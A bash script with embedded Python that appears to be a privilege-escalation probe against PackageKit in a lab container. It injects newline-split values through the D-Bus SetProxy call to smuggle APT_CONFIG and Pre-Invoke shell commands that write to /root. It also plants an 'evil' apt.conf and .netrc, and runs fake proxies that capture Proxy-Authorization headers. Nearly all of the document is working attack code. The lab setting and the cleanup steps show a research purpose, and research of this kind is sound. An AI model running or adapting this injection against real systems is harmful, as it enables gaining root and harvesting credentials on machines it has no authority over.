#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/packagekit-active-proxy-injection.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

run_in_target() {
  run docker exec "$TARGET" bash -lc "$1"
}

echo "PackageKit active proxy/config injection probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

run_in_target '
set -euo pipefail
echo "== baseline target =="
cat /etc/os-release | sed -n "1,8p"
uname -a
id attacker
id selfauth
echo
echo "== package/default proof =="
dpkg-query -W -f="\${Package}\t\${Version}\t\${Status}\n" \
  packagekit packagekit-tools libpackagekit-glib2-18 python3-gi apt polkitd dbus systemd 2>&1 || true
apt-cache show packagekit | sed -n "1,35p"
echo
echo "== packagekit service =="
systemctl cat packagekit.service
systemctl status packagekit.service --no-pager -l || true
echo
echo "== packagekit policy snippets =="
nl -ba /usr/share/polkit-1/actions/org.freedesktop.packagekit.policy | sed -n "1009,1168p"
echo
echo "== packagekit dbus interface snippets =="
sed -n "378,430p" /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.xml
sed -n "887,925p" /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml
sed -n "665,705p" /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml
sed -n "1424,1468p" /usr/share/dbus-1/interfaces/org.freedesktop.PackageKit.Transaction.xml
echo
echo "== default writable roots =="
for p in /etc/apt /etc/apt/apt.conf.d /etc/PackageKit /var/lib/PackageKit /var/cache/PackageKit /root; do
  stat -c "%A %U:%G %n" "$p"
done
'

echo
echo '$ docker exec -i '"$TARGET"' bash'
docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail

work=/tmp/packagekit-active-proxy-injection
home=/home/selfauth
runner="$home/packagekit_active_proxy_injection_runner.sh"
profile="$home/.bash_profile"
profile_bak="$home/.bash_profile.packagekit-active-proxy-injection.bak"
marker=/root/packagekit_active_proxy_injection_root
monitor_log="$work/root-monitor.log"
active_log="$work/active.log"
monitor_pid=

cleanup() {
  set +e
  if [[ -n "${monitor_pid:-}" ]]; then
    kill "$monitor_pid" 2>/dev/null || true
    wait "$monitor_pid" 2>/dev/null || true
  fi
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  if [[ -e "$profile_bak" ]]; then
    mv -f "$profile_bak" "$profile"
    chown selfauth:selfauth "$profile"
  else
    rm -f "$profile"
  fi
  rm -f "$runner"
  rm -f "$marker"
  rm -rf "$work"
  systemctl restart packagekit.service >/dev/null 2>&1 || true
}
trap cleanup EXIT

echo "== cleanup before =="
systemctl restart packagekit.service || true
rm -f "$marker"
rm -rf "$work"
install -d -o selfauth -g selfauth -m 0700 "$work"
loginctl terminate-user selfauth >/dev/null 2>&1 || true
systemctl stop getty@tty1.service >/dev/null 2>&1 || true

if [[ -e "$profile" ]]; then
  cp -a "$profile" "$profile_bak"
fi

cat > "$work/root_monitor.py" <<'PYROOT'
#!/usr/bin/env python3
import os
import time

needles = (
    b"PKPROBE",
    b"APT_CONFIG",
    b"Acquire::",
    b"http_proxy",
    b"https_proxy",
    b"ftp_proxy",
    b"no_proxy",
    b"DEBCONF_PIPE",
    b"Dir::Etc",
)
printed = set()
end = time.time() + 45

def read(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return b""

while time.time() < end:
    for name in os.listdir("/proc"):
        if not name.isdigit():
            continue
        base = "/proc/" + name
        env = read(base + "/environ")
        if not env or not any(n in env for n in needles):
            continue
        try:
            uid = os.stat(base).st_uid
        except Exception:
            uid = -1
        cmd = read(base + "/cmdline").replace(b"\0", b" ").decode("utf-8", "replace")
        if uid != 0 and "apt" not in cmd and "packagekit" not in cmd:
            continue
        items = [x for x in env.split(b"\0") if any(n in x for n in needles)]
        key = (name, tuple(items))
        if key in printed:
            continue
        printed.add(key)
        print(f"ENV_SNAPSHOT pid={name} uid={uid} cmd={cmd!r}", flush=True)
        separate_apt_config = False
        separate_acquire = False
        for item in items:
            if item.startswith(b"APT_CONFIG="):
                separate_apt_config = True
            if item.startswith(b"Acquire::"):
                separate_acquire = True
            print(f"  ENV_ITEM {item!r}", flush=True)
        print(f"  SEPARATE_APT_CONFIG={int(separate_apt_config)} SEPARATE_ACQUIRE={int(separate_acquire)}", flush=True)
    time.sleep(0.05)
PYROOT
chmod 0755 "$work/root_monitor.py"

cat > "$work/active_probe.py" <<'PYACTIVE'
#!/usr/bin/env python3
import base64
import os
import socket
import struct
import threading
import time

import gi
gi.require_version("Gio", "2.0")
from gi.repository import Gio, GLib

BUS = "org.freedesktop.PackageKit"
ROOT = "/org/freedesktop/PackageKit"
PK = "org.freedesktop.PackageKit"
TX = "org.freedesktop.PackageKit.Transaction"
PROPS = "org.freedesktop.DBus.Properties"
ONLY_DOWNLOAD = 8

work = "/tmp/packagekit-active-proxy-injection"
home = "/home/selfauth"
marker = "/root/packagekit_active_proxy_injection_root"
evil_conf = os.path.join(work, "evil-apt.conf")
netrc = os.path.join(home, ".netrc")
auth_conf = os.path.join(work, "auth.conf")
pac_file = os.path.join(work, "probe.pac")

os.makedirs(work, exist_ok=True)

conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)


class FakeProxy:
    def __init__(self, label, delay=1.0, status="200 OK"):
        self.label = label
        self.delay = delay
        self.status = status
        self.count = 0
        self.auth_headers = []
        self.first_lines = []
        self.stop = threading.Event()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.port = self.sock.getsockname()[1]
        self.sock.listen(32)
        self.sock.settimeout(0.25)
        self.thread = threading.Thread(target=self._accept, daemon=True)
        self.thread.start()
        print(f"PROXY_READY label={self.label} port={self.port}", flush=True)

    def _accept(self):
        while not self.stop.is_set():
            try:
                client, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError as exc:
                if not self.stop.is_set():
                    print(f"PROXY_ACCEPT_ERROR label={self.label} error={exc!r}", flush=True)
                break
            threading.Thread(target=self._handle, args=(client, addr), daemon=True).start()

    def _handle(self, client, addr):
        try:
            client.settimeout(2.0)
            data = b""
            while b"\r\n\r\n" not in data and len(data) < 32768:
                chunk = client.recv(4096)
                if not chunk:
                    break
                data += chunk
            self.count += 1
            text = data.decode("latin1", "replace")
            first = text.splitlines()[0] if text.splitlines() else ""
            self.first_lines.append(first)
            headers = []
            for line in text.splitlines():
                low = line.lower()
                if low.startswith(("get ", "host:", "proxy-authorization:", "authorization:", "user-agent:")):
                    headers.append(line)
                if low.startswith("proxy-authorization:"):
                    self.auth_headers.append(line)
            print(f"PROXY_HIT label={self.label} addr={addr} first={first!r}", flush=True)
            for header in headers[:8]:
                print(f"PROXY_HEADER label={self.label} {header!r}", flush=True)
            body = (
                f"PKPROBE fake proxy body label={self.label}\n"
                f"APT_CONFIG={evil_conf}\n"
                f"Acquire::http::Proxy::ports.ubuntu.com \"http://127.0.0.1:1/\";\n"
                f"APT::Update::Pre-Invoke:: \"/bin/sh -c 'id > {marker}'\";\n"
            ).encode("utf-8")
            response = (
                f"HTTP/1.1 {self.status}\r\n"
                "Content-Type: text/plain\r\n"
                f"Content-Length: {len(body)}\r\n"
                "Connection: close\r\n"
                "\r\n"
            ).encode("ascii") + body
            time.sleep(self.delay)
            client.sendall(response)
        except Exception as exc:
            print(f"PROXY_HANDLE_ERROR label={self.label} error={exc!r}", flush=True)
        finally:
            try:
                client.close()
            except Exception:
                pass

    def close(self):
        self.stop.set()
        try:
            poke = socket.create_connection(("127.0.0.1", self.port), timeout=0.05)
            poke.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.thread.join(timeout=1.0)


class UnixListener:
    def __init__(self, label):
        self.label = label
        self.path = os.path.join(work, f"{label}.sock")
        self.events = []
        self.stop = threading.Event()
        try:
            os.unlink(self.path)
        except FileNotFoundError:
            pass
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.bind(self.path)
        os.chmod(self.path, 0o666)
        self.sock.listen(8)
        self.sock.settimeout(0.25)
        self.thread = threading.Thread(target=self._accept, daemon=True)
        self.thread.start()
        print(f"FRONTEND_READY label={self.label} path={self.path}", flush=True)

    def _accept(self):
        while not self.stop.is_set():
            try:
                client, _ = self.sock.accept()
            except socket.timeout:
                continue
            except OSError as exc:
                if not self.stop.is_set():
                    print(f"FRONTEND_ACCEPT_ERROR label={self.label} error={exc!r}", flush=True)
                break
            try:
                cred = client.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, struct.calcsize("3i"))
                pid, uid, gid = struct.unpack("3i", cred)
                self.events.append((pid, uid, gid))
                print(f"FRONTEND_CONNECT label={self.label} pid={pid} uid={uid} gid={gid}", flush=True)
            except Exception as exc:
                print(f"FRONTEND_HANDLE_ERROR label={self.label} error={exc!r}", flush=True)
            finally:
                try:
                    client.close()
                except Exception:
                    pass

    def close(self):
        self.stop.set()
        try:
            poke = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            poke.settimeout(0.05)
            poke.connect(self.path)
            poke.close()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.thread.join(timeout=1.0)
        try:
            os.unlink(self.path)
        except FileNotFoundError:
            pass


def call(path, iface, method, params=None, timeout=10000):
    return conn.call_sync(BUS, path, iface, method, params, None, Gio.DBusCallFlags.NONE, timeout, None)


def can_authorize(action):
    try:
        ret = call(ROOT, PK, "CanAuthorize", GLib.Variant("(s)", (action,)), 10000)
        print(f"CAN_AUTHORIZE {action} -> {ret.unpack()[0]}", flush=True)
    except GLib.Error as exc:
        print(f"CAN_AUTHORIZE_ERROR {action}: {exc.message}", flush=True)


def create_tx():
    ret = call(ROOT, PK, "CreateTransaction", None, 10000)
    tx = ret.unpack()[0]
    try:
        props = call(tx, PROPS, "GetAll", GLib.Variant("(s)", (TX,)), 5000).unpack()[0]
        picked = {k: props[k] for k in ("Uid", "CallerActive", "Role", "Status", "TransactionFlags", "Interactive") if k in props}
        print(f"TX_CREATE {tx} props={picked}", flush=True)
    except GLib.Error as exc:
        print(f"TX_PROPS_ERROR {tx}: {exc.message}", flush=True)
    return tx


def set_hints(tx, hints, label):
    try:
        call(tx, TX, "SetHints", GLib.Variant("(as)", (hints,)), 5000)
        print(f"SET_HINTS_OK label={label} hints={hints!r}", flush=True)
    except GLib.Error as exc:
        print(f"SET_HINTS_ERR label={label}: {exc.message}", flush=True)


def set_proxy(label, args):
    print(f"SET_PROXY label={label}", flush=True)
    for name, value in zip(("http", "https", "ftp", "socks", "no_proxy", "pac"), args):
        print(f"  {name}={value!r}", flush=True)
    try:
        call(ROOT, PK, "SetProxy", GLib.Variant("(ssssss)", args), 10000)
        print(f"SET_PROXY_OK label={label}", flush=True)
    except GLib.Error as exc:
        print(f"SET_PROXY_ERR label={label}: {exc.message}", flush=True)


def collect_package_ids(obj, out):
    if isinstance(obj, str) and obj.count(";") >= 3:
        out.append(obj)
    elif isinstance(obj, (list, tuple)):
        for item in obj:
            collect_package_ids(item, out)


def run_tx(label, method, params, hints=None, timeout_s=35):
    print(f"RUN_TX label={label} method={method}", flush=True)
    tx = create_tx()
    packages = []
    finished = []
    errors = []
    loop = GLib.MainLoop()

    def on_signal(_conn, _sender, _path, _iface, signal_name, parameters, _user_data):
        unpacked = parameters.unpack()
        print(f"TX_SIGNAL label={label} signal={signal_name} data={unpacked!r}", flush=True)
        if signal_name in ("Package", "Packages"):
            collect_package_ids(unpacked, packages)
        if signal_name == "ErrorCode":
            errors.append(unpacked)
        if signal_name == "Finished":
            finished.append(unpacked)
            loop.quit()

    sub = conn.signal_subscribe(BUS, TX, None, tx, None, Gio.DBusSignalFlags.NONE, on_signal, None)
    try:
        if hints:
            set_hints(tx, hints, label)
        try:
            call(tx, TX, method, params, 15000)
            print(f"TX_CALL_OK label={label} method={method}", flush=True)
        except GLib.Error as exc:
            print(f"TX_CALL_ERR label={label} method={method}: {exc.message}", flush=True)
            return packages, errors, finished
        GLib.timeout_add_seconds(timeout_s, loop.quit)
        loop.run()
        if not finished:
            print(f"TX_TIMEOUT label={label} seconds={timeout_s}", flush=True)
        return packages, errors, finished
    finally:
        conn.signal_unsubscribe(sub)


def main():
    print("== active identity ==", flush=True)
    os.system("id; tty; loginctl user-status selfauth --no-pager 2>/dev/null | sed -n '1,35p' || true")
    for action in (
        "org.freedesktop.packagekit.system-network-proxy-configure",
        "org.freedesktop.packagekit.system-sources-refresh",
        "org.freedesktop.packagekit.system-update",
        "org.freedesktop.packagekit.package-install",
    ):
        can_authorize(action)

    injection = FakeProxy("newline-config", delay=1.5)
    alt = FakeProxy("acquire-alt", delay=0.3)
    auth = FakeProxy("auth-userinfo", delay=0.5)
    listeners = []
    try:
        with open(netrc, "w", encoding="utf-8") as f:
            f.write("machine ports.ubuntu.com login PKNETRC_LOGIN password PKNETRC_PASS\n")
        os.chmod(netrc, 0o600)
        with open(auth_conf, "w", encoding="utf-8") as f:
            f.write("machine ports.ubuntu.com login PKAUTHCONF_LOGIN password PKAUTHCONF_PASS\n")
        with open(evil_conf, "w", encoding="utf-8") as f:
            f.write(f"APT::Update::Pre-Invoke {{ \"/bin/sh -c 'id > {marker}'\"; }};\n")
            f.write(f"DPkg::Pre-Invoke {{ \"/bin/sh -c 'id >> {marker}'\"; }};\n")
            f.write(f'Acquire::http::Proxy "http://127.0.0.1:{alt.port}/";\n')
            f.write(f'Dir::Etc::netrc "{netrc}";\n')
        with open(pac_file, "w", encoding="utf-8") as f:
            f.write(f"function FindProxyForURL(url, host) {{ return 'PROXY 127.0.0.1:{alt.port}; DIRECT'; }}\n")
        print(f"EVIL_APT_CONFIG={evil_conf}", flush=True)
        print(f"EVIL_NETRC={netrc}", flush=True)
        print(f"EVIL_AUTH_CONF={auth_conf}", flush=True)

        newline_proxy = (
            f"127.0.0.1:{injection.port}\n"
            f"APT_CONFIG={evil_conf}\n"
            "PKPROBE_NEWLINE_SPLIT=1\n"
            f"Acquire::http::Proxy::ports.ubuntu.com \"http://127.0.0.1:{alt.port}/\";\n"
            f"APT::Update::Pre-Invoke:: \"/bin/sh -c 'id > {marker}'\";\n"
            "sh -c 'id >/root/packagekit_active_proxy_injection_root'"
        )
        pac_value = f"file://{pac_file}\nAPT_CONFIG={evil_conf}\nPKPROBE_PAC=1"
        no_proxy_value = f"localhost,127.0.0.1\nDir::Etc::netrc={netrc}\nPKPROBE_NOPROXY=1"
        set_proxy("newline-config", (newline_proxy, newline_proxy, newline_proxy, "", no_proxy_value, pac_value))
        frontend = UnixListener("refresh-newline")
        listeners.append(frontend)
        run_tx(
            "refresh-newline-config",
            "RefreshCache",
            GLib.Variant("(b)", (True,)),
            hints=[f"frontend-socket={frontend.path}", "interactive=true"],
            timeout_s=45,
        )
        print(f"PROXY_COUNT newline-config={injection.count} acquire-alt={alt.count}", flush=True)
        print(f"FRONTEND_COUNT refresh-newline={len(frontend.events)}", flush=True)

        auth_proxy = f"pkuser:pkpass@127.0.0.1:{auth.port}"
        set_proxy("auth-userinfo", (auth_proxy, "", "", "", "", ""))
        run_tx("refresh-auth-userinfo", "RefreshCache", GLib.Variant("(b)", (True,)), timeout_s=35)
        expected = "Basic " + base64.b64encode(b"pkuser:pkpass").decode("ascii")
        print(f"AUTH_PROXY_COUNT={auth.count}", flush=True)
        print(f"AUTH_PROXY_EXPECTED_HEADER={expected}", flush=True)
        print(f"AUTH_PROXY_HEADERS={auth.auth_headers!r}", flush=True)

        before_clear = injection.count + alt.count + auth.count
        set_proxy("clear-empty", ("", "", "", "", "", ""))
        run_tx("refresh-after-clear", "RefreshCache", GLib.Variant("(b)", (True,)), timeout_s=35)
        after_clear = injection.count + alt.count + auth.count
        print(f"STALE_AFTER_CLEAR_PROXY_HITS={after_clear - before_clear}", flush=True)

        refresh_front = UnixListener("frontend-refresh-clear")
        listeners.append(refresh_front)
        run_tx(
            "frontend-refresh-clear",
            "RefreshCache",
            GLib.Variant("(b)", (False,)),
            hints=[f"frontend-socket={refresh_front.path}", "interactive=true"],
            timeout_s=35,
        )
        print(f"FRONTEND_COUNT refresh-clear={len(refresh_front.events)}", flush=True)

        get_updates_front = UnixListener("frontend-getupdates")
        listeners.append(get_updates_front)
        packages, _errors, _finished = run_tx(
            "frontend-getupdates",
            "GetUpdates",
            GLib.Variant("(t)", (0,)),
            hints=[f"frontend-socket={get_updates_front.path}", "interactive=true"],
            timeout_s=35,
        )
        unique_packages = []
        for pkg in packages:
            if pkg not in unique_packages:
                unique_packages.append(pkg)
        print(f"GETUPDATES_PACKAGE_COUNT={len(unique_packages)}", flush=True)
        for pkg in unique_packages[:5]:
            print(f"GETUPDATES_PACKAGE={pkg}", flush=True)
        print(f"FRONTEND_COUNT getupdates={len(get_updates_front.events)}", flush=True)

        update_targets = unique_packages[:1] if unique_packages else ["bash;0:0;arm64;ubuntu"]
        update_download_front = UnixListener("frontend-update-only-download")
        listeners.append(update_download_front)
        run_tx(
            "frontend-update-only-download",
            "UpdatePackages",
            GLib.Variant("(tas)", (ONLY_DOWNLOAD, update_targets)),
            hints=[f"frontend-socket={update_download_front.path}", "interactive=true"],
            timeout_s=35,
        )
        print(f"FRONTEND_COUNT update-only-download={len(update_download_front.events)}", flush=True)

        update_real_front = UnixListener("frontend-update-real")
        listeners.append(update_real_front)
        run_tx(
            "frontend-update-real",
            "UpdatePackages",
            GLib.Variant("(tas)", (0, update_targets)),
            hints=[f"frontend-socket={update_real_front.path}", "interactive=true"],
            timeout_s=20,
        )
        print(f"FRONTEND_COUNT update-real={len(update_real_front.events)}", flush=True)
    finally:
        set_proxy("final-clear", ("", "", "", "", "", ""))
        for listener in listeners:
            listener.close()
        injection.close()
        alt.close()
        auth.close()
        try:
            os.unlink(netrc)
        except FileNotFoundError:
            pass

    print("ACTIVE_PROBE_DONE", flush=True)


if __name__ == "__main__":
    main()
PYACTIVE
chmod 0755 "$work/active_probe.py"
chown -R selfauth:selfauth "$work"

cat > "$runner" <<'SHRUN'
#!/usr/bin/env bash
set -Eeuo pipefail
exec > /tmp/packagekit-active-proxy-injection/active.log 2>&1
export HOME=/home/selfauth
export USER=selfauth
export LOGNAME=selfauth
export PKPROBE_ACTIVE_SESSION=1
python3 /tmp/packagekit-active-proxy-injection/active_probe.py
SHRUN
chmod 0755 "$runner"
chown selfauth:selfauth "$runner"

cat > "$profile" <<EOF
exec "$runner"
EOF
chown selfauth:selfauth "$profile"
chmod 0644 "$profile"

echo "== start root env monitor =="
"$work/root_monitor.py" > "$monitor_log" 2>&1 &
monitor_pid=$!

echo "== launch active tty selfauth probe =="
set +e
openvt -c 1 -s -f -w -- /bin/login -f selfauth
openvt_rc=$?
set -e
echo "openvt_rc=$openvt_rc"

kill "$monitor_pid" 2>/dev/null || true
wait "$monitor_pid" 2>/dev/null || true
monitor_pid=

echo "== active probe log =="
sed -n '1,700p' "$active_log" || true
if grep -q 'ACTIVE_PROBE_DONE' "$active_log" 2>/dev/null; then
  echo "ACTIVE_PROBE_COMPLETED=1"
  openvt_rc=0
else
  echo "ACTIVE_PROBE_COMPLETED=0"
fi
echo "== root env monitor log =="
sed -n '1,260p' "$monitor_log" || true

echo "== root marker/config checks =="
if [[ -e "$marker" ]]; then
  echo "ROOT_PAYLOAD_MARKER_PRESENT"
  ls -l "$marker"
  sed -n '1,40p' "$marker"
else
  echo "NO_ROOT_PAYLOAD_MARKER"
fi
echo "-- grep PKPROBE/APT_CONFIG in root-owned config/state roots --"
find /etc/apt /etc/PackageKit /var/lib/PackageKit /var/cache/PackageKit /run -xdev \
  -type f -size -20M -print0 2>/dev/null |
  xargs -0 grep -a -n -E 'PKPROBE|APT_CONFIG|PKNETRC|PKAUTHCONF|packagekit_active_proxy_injection_root' 2>/dev/null |
  head -120 || true

echo "== cleanup explicit =="
loginctl terminate-user selfauth >/dev/null 2>&1 || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
if [[ -e "$profile_bak" ]]; then
  mv -f "$profile_bak" "$profile"
  chown selfauth:selfauth "$profile"
else
  rm -f "$profile"
fi
rm -f "$runner" "$marker"
rm -rf "$work"
systemctl restart packagekit.service || true

echo "== final target health =="
systemctl is-system-running || true
systemctl --failed --no-legend || true
for p in /tmp/packagekit-active-proxy-injection "$runner" "$marker"; do
  if [[ -e "$p" ]]; then
    echo "LEFTOVER $p"
  else
    echo "ABSENT $p"
  fi
done
exit "$openvt_rc"
TARGET_SCRIPT

run_in_target '
set -euo pipefail
echo "== post-run PackageKit/root state =="
systemctl is-system-running || true
systemctl --failed --no-legend || true
systemctl status packagekit.service --no-pager -l || true
test ! -e /root/packagekit_active_proxy_injection_root && echo NO_ROOT_PAYLOAD_MARKER_POST
test ! -e /tmp/packagekit-active-proxy-injection && echo NO_TMP_WORKDIR_POST
'
